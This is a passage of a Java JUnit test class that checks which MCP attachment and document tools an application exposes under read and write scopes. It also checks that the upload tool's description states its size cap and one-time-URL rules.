    @Test
    @DisplayName("the upload description states the cap, the main flag and the one-time URL")
    void uploadDescriptionStatesTheLimits() {
      String description = McpAttachmentToolDefinitions.REQUEST_UPLOAD_DESCRIPTION;
      assertTrue(description.contains("10 MB"), description);
      assertTrue(description.contains("main:true"), description);
      assertTrue(description.contains("exactly once"), description);
      assertTrue(description.contains("curl"), description);
    }

    @Test
    @DisplayName("read scope gets the list; write scope adds upload, delete and the document-reading tools; no spec, no tools")
    void toolsFollowTheScopes() {
      List<McpToolDefinition> read = new java.util.ArrayList<>();
      McpAttachmentToolDefinitions.addTo(read, List.of(SPEC), true, false);
      List<McpToolDefinition> write = new java.util.ArrayList<>();
      McpAttachmentToolDefinitions.addTo(write, List.of(SPEC), false, true);
      List<McpToolDefinition> none = new java.util.ArrayList<>();
      McpAttachmentToolDefinitions.addTo(none, List.of(), true, true);

      // ETP-5715: the document PDF tool rides on the read scope, next to the list.
      assertEquals(List.of(McpConstants.TOOL_NEO_LIST_ATTACHMENTS,
          McpConstants.TOOL_NEO_GET_DOCUMENT_PDF), names(read));
      // ETP-5715: purchase-invoice is declared in the OCR configuration, so the two document-reading
      // tools ride on the write scope after the attachment ones.
      assertEquals(List.of(McpConstants.TOOL_NEO_REQUEST_ATTACHMENT_UPLOAD,
          McpConstants.TOOL_NEO_DELETE_ATTACHMENT,
          McpConstants.TOOL_NEO_REQUEST_DOCUMENT_EXTRACTION_UPLOAD,
          McpConstants.TOOL_NEO_EXTRACT_INVOICE_DOCUMENT), names(write));
      assertTrue(none.isEmpty());
    }

    @Test
    @DisplayName("the email send joins the write scope only when some addressable spec has a send contract")
    void emailSendIsOfferedOnlyWithAContract() {
      List<McpToolDefinition> without = new java.util.ArrayList<>();
      List<McpToolDefinition> with = new java.util.ArrayList<>();
      try (MockedStatic<McpDocumentEmailContracts> contracts =
          mockStatic(McpDocumentEmailContracts.class, org.mockito.Mockito.CALLS_REAL_METHODS)) {
        contracts.when(() -> McpDocumentEmailContracts.supportedSpecs(any())).thenReturn(List.of());
        McpAttachmentToolDefinitions.addTo(without, List.of(SPEC), false, true);
        contracts.when(() -> McpDocumentEmailContracts.supportedSpecs(any()))
            .thenReturn(List.of(SPEC));
        McpAttachmentToolDefinitions.addTo(with, List.of(SPEC), false, true);
      }

      assertFalse(names(without).contains(McpConstants.TOOL_NEO_SEND_DOCUMENT_EMAIL));
      assertEquals(List.of(McpConstants.TOOL_NEO_REQUEST_ATTACHMENT_UPLOAD,
          McpConstants.TOOL_NEO_DELETE_ATTACHMENT, McpConstants.TOOL_NEO_SEND_DOCUMENT_EMAIL,
          McpConstants.TOOL_NEO_REQUEST_DOCUMENT_EXTRACTION_UPLOAD,
          McpConstants.TOOL_NEO_EXTRACT_INVOICE_DOCUMENT), names(with));
    }

    private List<String> names(List<McpToolDefinition> tools) {
      return tools.stream().map(McpToolDefinition::getName).collect(java.util.stream.Collectors.toList());
    }
  }
}
